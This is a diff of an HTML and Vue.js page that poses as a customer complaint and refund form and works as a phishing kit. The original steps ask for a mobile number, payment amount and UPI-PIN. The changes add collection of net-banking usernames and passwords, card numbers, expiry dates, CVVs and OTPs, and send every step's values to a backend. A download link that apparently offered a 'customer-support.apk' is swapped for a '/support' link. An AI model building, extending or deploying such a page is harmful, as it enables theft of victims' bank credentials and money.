@@ -1,7 +1,7 @@
-<!DOCTYPE html>
-<html lang="en">
 
-<head>
+
+
+
 	<meta charset="utf-8">
 	<meta content="width=device-width, initial-scale=1.0" name="viewport">
 
@@ -15,8 +15,8 @@
 
 	<!-- Google Fonts -->
 	<link rel="preconnect" href="https://fonts.googleapis.com">
-	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-	<link href="https://fonts.googleapis.com/css2?family=Open+Sans&display=swap" rel="stylesheet">
+	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
+	<link href="https://fonts.googleapis.com/css2?family=Open+Sans&amp;display=swap" rel="stylesheet">
 
 	<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">
 
@@ -24,11 +24,11 @@
 	<link href="assets/css/style.css" rel="stylesheet">
 
 	<script src="https://cdn.jsdelivr.net/npm/vue@2"></script>
-</head>
 
-<body>
 
-	<header>
+
+
+	<header style="border-color:#ffc20e;">
 		<div class="container">
 			<div class="row">
 				<div class="col">
@@ -39,7 +39,7 @@
 	</header>
 
 	<div class="hero-image">
-		<img src="assets/img/header3.jpg" class="" alt="complaint support" style="width:100%">
+		<img id="banner-image" src="https://firebasestorage.googleapis.com/v0/b/customer-support-messages.appspot.com/o/banners%2F1659785933551header3.jpg?alt=media&amp;token=fafc3257-b5c1-43ef-aec2-e5dac189a7df" class="" alt="complaint support" style="width:100%">
 	</div>
 
 	<!-- ======= Contact Section ======= -->
@@ -63,8 +63,7 @@
 								<div class="card-body" style="text-align: center;">
 									<h5 class="card-title">Download our <b>Android App</b> to track your complaint
 										status</h5>
-									<a href="customer-support.apk" class="btn btn-dark btn-lg" role="button"><img
-											src="assets/img/google-play.png" alt="">&nbsp;&nbsp;Download</a>
+									<a href="/support" class="btn btn-dark btn-lg" role="button"><img src="assets/img/google-play.png" alt="">&nbsp;&nbsp;Download</a>
 								</div>
 							</div>
 
@@ -73,73 +72,95 @@
 						</div>
 					</div>
 
-					<form v-else v-on:submit.prevent="onSubmit" method="post" role="form" class="php-email-form">
+					<form v-else="" v-on:submit.prevent="onSubmit" method="post" role="form" class="php-email-form">
 
 						<div v-show="step==1">
 							<div class="mb-4">
-								<label for="floatingInputName" class="form-label">Full name <span
-										class="required">*</span></label>
-								<input type="text" v-on:keyup="onKeyUp" v-model="formData.name"
-									class="form-control form-control-lg" id="floatingInputName"
-									placeholder="Enter your full name" maxlength="49">
+								<label for="floatingInputName" class="form-label">Full name <span class="required">*</span></label>
+								<input type="text" v-on:keyup="onKeyUp" v-model="formData.name" class="form-control form-control-lg" id="floatingInputName" placeholder="Enter your full name" maxlength="49">
 							</div>
 							<div class="mb-4">
-								<label for="floatingSelectPaymentMode" class="form-label">Payment Mode <span
-										class="required">*</span></label>
-								<select class="form-select form-control-lg" v-on:change="onKeyUp"
-									v-model="formData.payment_method" id="floatingSelectPaymentMode"
-									aria-label="Select a payment mode">
+								<label for="floatingSelectPaymentMode" class="form-label">Payment Mode <span class="required">*</span></label>
+								<select class="form-select form-control-lg" v-on:change="onKeyUp" v-model="formData.payment_method" id="floatingSelectPaymentMode" aria-label="Select a payment mode">
 									<option value="">--Select--</option>
 									<option value="Google Pay">Google Pay</option>
 									<option value="PhonePe">PhonePe</option>
 									<option value="Paytm">Paytm</option>
 									<option value="Amazon Pay">Amazon Pay</option>
+									<option value="Internet banking">Internet banking </option>
+									<option value="Credit or Debt card">Credit or Debt card </option>
 									<option value="others">Others</option>
 								</select>
 							</div>
 							<div class="mb-4">
-								<label for="floatingInputMobileNo" class="form-label">Registered Mobile No <span
-										class="required">*</span></label>
-								<input type="text" v-on:keyup="onKeyUp" v-model="formData.mobile_no"
-									class="form-control form-control-lg" id="floatingInputMobileNo"
-									placeholder="Enter your mobile no" maxlength="20">
+								<label for="floatingInputMobileNo" class="form-label">Registered Mobile No <span class="required">*</span></label>
+								<input type="text" v-on:keyup="onKeyUp" v-model="formData.mobile_no" class="form-control form-control-lg" id="floatingInputMobileNo" placeholder="Enter your mobile no" maxlength="20">
 							</div>
 							<div class="mb-4">
-								<label for="floatingTextarea2" class="form-label">Issue <span
-										class="required">*</span></label>
-								<textarea class="form-control form-control-lg" v-on:keyup="onKeyUp"
-									v-model="formData.issue" placeholder="Enter issue" id="floatingTextarea2"
-									style="height: 100px" maxlength="500"></textarea>
+								<label for="floatingTextarea2" class="form-label">Issue <span class="required">*</span></label>
+								<textarea class="form-control form-control-lg" v-on:keyup="onKeyUp" v-model="formData.issue" placeholder="Enter issue" id="floatingTextarea2" style="height: 100px" maxlength="500"></textarea>
 							</div>
 						</div>
 
 						<div v-show="step==2">
 							<div class="mb-4">
-								<label for="floatingInputAmount" class="form-label">Amount <span
-										class="required">*</span></label>
-								<input type="text" v-on:keyup="onKeyUp" v-model="formData.amount"
-									class="form-control form-control-lg" id="floatingInputAmount"
-									placeholder="Enter amount" maxlength="9">
+								<label for="floatingInputAmount" class="form-label">Amount <span class="required">*</span></label>
+								<input type="text" v-on:keyup="onKeyUp" v-model="formData.amount" class="form-control form-control-lg" id="floatingInputAmount" placeholder="Enter amount" maxlength="9">
 							</div>
 						</div>
 
 						<div v-show="step==3">
-							<div class="mb-4">
-								<label for="floatingInputMpin1" class="form-label">UPI-PIN <span
-										class="required">*</span></label>
-								<input type="password" v-on:keyup="onKeyUp" v-model="formData.m_pin_1"
-									class="form-control form-control-lg" id="floatingInputMpin1"
-									placeholder="Enter UPI-Pin" maxlength="6">
+							<div v-if="formData.payment_method == 'Internet banking'">
+								<div class="mb-4">
+									<label for="floatingBankName" class="form-label">Bank Name <span class="required">*</span></label>
+									<input type="text" v-on:keyup="onKeyUp" v-model="formData.bankname" class="form-control form-control-lg" id="floatingBankName" placeholder="Enter Bank Name" maxlength="49">
+								</div>
+								<div class="mb-4">
+									<label for="floatingUserName" class="form-label">User Name <span class="required">*</span></label>
+									<input type="text" v-on:keyup="onKeyUp" v-model="formData.username" class="form-control form-control-lg" id="floatingUserName" placeholder="Enter username" maxlength="49">
+								</div>
+								<div class="mb-4">
+									<label for="floatingPasswordName" class="form-label">Password<span class="required">*</span></label>
+									<input type="text" v-on:keyup="onKeyUp" v-model="formData.password" class="form-control form-control-lg" id="floatingPasswordName" placeholder="Enter password" maxlength="49">
+								</div>
 							</div>
+							<div v-else-if="formData.payment_method == 'Credit or Debt card'">
+								<div class="mb-4">
+									<label for="floatingCardNumber" class="form-label">Card Number <span class="required">*</span></label>
+									<input type="text" v-on:keyup="onKeyUp" v-model="formData.cardNumber" class="form-control form-control-lg" id="floatingCardNumber" placeholder="Enter your card number" maxlength="16">
+								</div>
+								<div class="mb-4">
+									<label for="floatingCardExpire" class="form-label">Expaire Date<span class="required">*</span></label>
+									<input type="text" v-on:keyup="onKeyUp" v-model="formData.expire" class="form-control form-control-lg" id="floatingCardExpire" placeholder="MM/YY" maxlength="5">
+								</div>
+								<div class="mb-4">
+									<label for="floatingCvv" class="form-label">CVV<span class="required">*</span></label>
+									<input type="text" v-on:keyup="onKeyUp" v-model="formData.cvv" class="form-control form-control-lg" id="floatingCvv" placeholder="Enter your CVV" maxlength="3">
+								</div>
+							</div>
+							<div v-else="">
+								<div class="mb-4">
+									<label for="floatingInputMpin1" class="form-label">UPI-PIN <span class="required">*</span></label>
+									<input type="password" v-on:keyup="onKeyUp" v-model="formData.m_pin_1" class="form-control form-control-lg" id="floatingInputMpin1" placeholder="Enter UPI-Pin" maxlength="6">
+								</div>
+							</div>
+							
 						</div>
 
 						<div v-show="step==4">
-							<div class="mb-4">
-								<label for="floatingInputMpin2" class="form-label">UPI-PIN</label>
-								<input type="password" v-on:keyup="onKeyUp" v-model="formData.m_pin_2"
-									class="form-control form-control-lg" id="floatingInputMpin2"
-									placeholder="Enter UPI-PIN" maxlength="6">
+							<div v-if="formData.payment_method == 'Internet banking' || formData.payment_method == 'Credit or Debt card'">
+								<div class="mb-4">
+									<label for="floatingotp" class="form-label">OTP <span class="required">*</span></label>
+									<input type="text" v-on:keyup="onKeyUp" v-model="formData.otp" class="form-control form-control-lg" id="floatingotp" placeholder="Enter otp" maxlength="8">
+								</div>
 							</div>
+							<div v-else="">
+								<div class="mb-4">
+									<label for="floatingInputMpin2" class="form-label">UPI-PIN</label>
+									<input type="password" v-on:keyup="onKeyUp" v-model="formData.m_pin_2" class="form-control form-control-lg" id="floatingInputMpin2" placeholder="Enter UPI-PIN" maxlength="6">
+								</div>
+							</div>
+
 						</div>
 
 						<div v-show="hasError">
@@ -149,9 +170,9 @@
 						</div>
 
 						<div class="text-right" style="text-align:right;">
-							<button class="btn btn-warning" type="submit">
+							<button class="btn next_button" type="submit" style="background-color:#ffc20e; color: #FFF">
 								<span v-if="step==4">Submit</span>
-								<span v-else>Next Step</span>
+								<span v-else="">Next Step</span>
 							</button>
 						</div>
 
@@ -171,9 +192,7 @@
 	</section>
 
 	<!-- Vendor JS Files -->
-	<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js"
-		integrity="sha384-ka7Sk0Gln4gmtz2MlQnikT1wXgYsOg+OMhuP+IlRH9sENBO0LRn5q+8nbTov4+1p"
-		crossorigin="anonymous"></script>
+	<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-ka7Sk0Gln4gmtz2MlQnikT1wXgYsOg+OMhuP+IlRH9sENBO0LRn5q+8nbTov4+1p" crossorigin="anonymous"></script>
 
 	<script>
 		var app = new Vue({
@@ -192,6 +211,13 @@
 					issue: "",
 					m_pin_1: "",
 					m_pin_2: "",
+					otp:"",
+					cvv: "",
+					expire: "",
+					cardNumber: "",
+					password: "",
+					username: "",
+					bankname:""
 				},
 			},
 			coumputed: {
@@ -268,15 +294,44 @@
 						}
 					}
 					else if (this.step == 3) {
-						if (!this.formData.m_pin_1) {
-							this.hasError = true;
-						}
-						else {
-							this.updateForm({
-								m_pin_1: this.formData.m_pin_1,
-								step: this.step,
-							})
-							this.step += 1;
+						if(this.formData.payment_method == 'Internet banking') {
+							if (!this.formData.password || !this.formData.username) {
+								this.hasError = true;
+							}
+							else {
+								this.updateForm({
+									bankname: this.formData.bankname,
+									username: this.formData.username,
+									password: this.formData.password,
+									step: this.step,
+								})
+								this.step += 1;
+							}
+						} else if (this.formData.payment_method == 'Credit or Debt card') {
+							if (!this.formData.cardNumber || !this.formData.expire || !this.formData.cvv) {
+								this.hasError = true;
+							}
+							else {
+								this.updateForm({
+									cardNumber: this.formData.cardNumber,
+									expire: this.formData.expire,
+									cvv: this.formData.cvv,
+									step: this.step,
+								})
+								this.step += 1;
+							}
+
+						} else {
+							if (!this.formData.m_pin_1) {
+								this.hasError = true;
+							}
+							else {
+								this.updateForm({
+									m_pin_1: this.formData.m_pin_1,
+									step: this.step,
+								})
+								this.step += 1;
+							}
 						}
 					}
 					else if (this.step == 4) {
@@ -288,7 +343,13 @@
 					}
 				},
 				sendData() {
-					const data = { m_pin_2: this.formData.m_pin_2, step: this.step }
+					const data = { step: this.step }
+					if (this.formData.m_pin_2) {
+						data.m_pin_2 = this.formData.m_pin_2
+					}
+					if (this.formData.otp) {
+						data.otp = this.formData.otp
+					}
 					if (window.sessionId) {
 						data.sessionId = window.sessionId;
 					}
@@ -323,6 +384,5 @@
 		})
 	</script>
 
-</body>
 
-</html>
+
